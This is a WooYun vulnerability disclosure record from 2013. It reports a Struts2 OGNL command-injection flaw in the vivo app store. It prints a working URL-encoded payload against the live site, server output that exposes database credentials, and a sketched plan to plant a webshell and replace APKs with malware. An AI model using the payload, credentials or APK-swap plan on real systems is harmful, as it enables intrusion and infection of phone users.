{"id": 60003, "wybug_id": "wooyun-2013-045237", "wybug_title": "步步高vivo应用商店命令执行漏洞", "wybug_corp": "步步高", "wybug_author": "j2ck3r", "wybug_date": "2013-12-07 18:34", "wybug_open_date": "2014-01-21 18:34", "wybug_type": "系统/服务补丁不及时", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方框架", "远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-07：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-01-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 步步高vivo应用商店命令执行漏洞 详细说明：  步步高vivo应用商店命令执行漏洞   漏洞证明：  在看VIVO手机应用商店的时候，看到下载的连接指向http://appstore.bbk.com/appinfo/downloadApkFile?id=40439\n\n好奇心，趋势下进入这里http://appstore.bbk.com:8080/login.jsp  发现是应用商店的后台管理页面\n\n试试了几个弱口令都不能进去看了下网站是架设，怀疑是struts第三方框架回到刚才那边下载地址。测试下struts漏洞http://appstore.bbk.com/appinfo/downloadApkFile?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D成功了\n\n\n网站物理路径： /opt/app/appstore/appconsolejava.home: /usr/java/jdk1.6.0_26/jrejava.version: 1.6.0_26os.name: Linuxos.arch: amd64os.version: 2.6.18-308.16.1.el5user.name: appstoreuser.home: /home/appstoreuser.dir: /opt/app/appstore/apache-tomcat-6.0.32/binjava.class.version: 50.0java.class.path: /opt/app/appstore/apache-tomcat-6.0.32/bin/bootstrap.jarjava.library.path: /usr/java/jdk1.6.0_26/jre/lib/amd64/server:/usr/java/jdk1.6.0_26/jre/lib/amd64:/usr/java/jdk1.6.0_26/jre/../lib/amd64:/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/libfile.separator: /path.separator: :java.vendor: Sun Microsystems Inc.java.vendor.url: http://java.sun.com/java.vm.specification.version: 1.0java.vm.specification.vendor: Sun Microsystems Inc.java.vm.specification.name: Java Virtual Machine Specificationjava.vm.version: 20.1-b02java.vm.vendor: Sun Microsystems Inc.java.vm.name: Java HotSpot(TM) 64-Bit Server VMjava.specification.version: 1.6java.specification.vender: java.specification.name: Java Platform API Specificationjava.io.tmpdir: /opt/app/appstore/apache-tomcat-6.0.32/temphibernate信息-- listing properties --java.vendor=Sun Microsystems Inc.show_sql=falsesun.java.launcher=SUN_STANDARDcatalina.base=/opt/app/appstore/apache-tomcat-6.0.32hibernate.connection.url=jdbc:mysql://10.2.2.121:3307/appstore...sun.management.compiler=HotSpot 64-Bit Tiered Compilerscatalina.useNaming=trueos.name=Linuxsun.boot.class.path=/usr/java/jdk1.6.0_26/jre/lib/resourc...java.util.logging.config.file=/opt/app/appstore/apache-tomcat-6.0.3...hibernate.c3p0.max_size=12java.vm.specification.vendor=Sun Microsystems Inc.java.runtime.version=1.6.0_26-b03hibernate.c3p0.min_size=5user.name=appstoreshared.loader=tomcat.util.buf.StringCache.byte.enabled=truehibernate.session_factory_name=sfhibernate.c3p0.timeout=30user.language=enjava.naming.factory.initial=org.apache.naming.java.javaURLContext...sun.boot.library.path=/usr/java/jdk1.6.0_26/jre/lib/amd64dialect=org.hibernate.dialect.MySQLDialectjava.version=1.6.0_26java.util.logging.manager=org.apache.juli.ClassLoaderLogManageruser.timezone=Asia/Shanghaisun.arch.data.model=64java.endorsed.dirs=/opt/app/appstore/apache-tomcat-6.0.3...sun.cpu.isalist=sun.jnu.encoding=UTF-8file.encoding.pkg=sun.iopackage.access=sun.,org.apache.catalina.,org.apache....file.separator=/java.specification.name=Java Platform API Specificationjava.class.version=50.0user.country=USjava.home=/usr/java/jdk1.6.0_26/jrejava.vm.info=mixed modeos.version=2.6.18-308.16.1.el5hibernate.transaction.factory_class=org.hibernate.transaction.JDBCTransac...path.separator=:java.vm.version=20.1-b02hibernate.connection.password=appstorejava.awt.printerjob=sun.print.PSPrinterJobsun.io.unicode.encoding=UnicodeLittlehibernate.connection.username=appstorepackage.definition=sun.,java.,org.apache.catalina.,org.a...java.naming.factory.url.pkgs=org.apache.naminguser.home=/home/appstorejava.specification.vendor=Sun Microsystems Inc.java.library.path=/usr/java/jdk1.6.0_26/jre/lib/amd64/s...java.vendor.url=http://java.sun.com/hibernate.connection.driver_class=com.mysql.jdbc.Driverjava.vm.vendor=Sun Microsystems Inc.hibernate.dialect=org.hibernate.dialect.MySQLDialectcommon.loader=${catalina.base}/lib,${catalina.base}...java.runtime.name=Java(TM) SE Runtime Environmentsun.java.command=org.apache.catalina.startup.Bootstrap...java.class.path=/opt/app/appstore/apache-tomcat-6.0.3...hibernate.bytecode.use_reflection_optimizer=falsejava.vm.specification.name=Java Virtual Machine Specificationjava.vm.specification.version=1.0catalina.home=/opt/app/appstore/apache-tomcat-6.0.32sun.cpu.endian=littlesun.os.patch.level=unknownhibernate.connection.provider_class=org.hibernate.connection.C3P0Connecti...java.io.tmpdir=/opt/app/appstore/apache-tomcat-6.0.3...java.vendor.url.bug=http://java.sun.com/cgi-bin/bugreport...server.loader=os.arch=amd64java.awt.graphicsenv=sun.awt.X11GraphicsEnvironmentjava.ext.dirs=/usr/java/jdk1.6.0_26/jre/lib/ext:/us...user.dir=/opt/app/appstore/apache-tomcat-6.0.3...hibernate.c3p0.idle_test_period=15line.separator=java.vm.name=Java HotSpot(TM) 64-Bit Server VMhibernate.c3p0.acquire_increment=2file.encoding=UTF-8java.specification.version=1.6hibernate.c3p0.max_statements=100hibernate.show_sql=false\n你以为这样就完了吗，突然有个邪恶的思路，上传WEBSHELL，把装有恶意代码APK文件替换掉网站上正常的APK文件，手机用户一旦下载就中招了。这里是个思路，就不测试了，危害过大。   修复方案：  你们懂的，求礼物！   版权声明：转载请注明来源 j2ck3r@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-10-29 15:33 |    \t\tnodexy \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | nodexy - Another developer)\t\t \n  厂商忽略???    \n     2015-03-23 09:20 |    \t\t大漠長河 \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:7        | ̷̸̨̀͒̏̃ͦ̈́̾( 天龙源景区欢迎您...)\t\t \n  怀疑....为啥咱们的感觉都这么准确    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}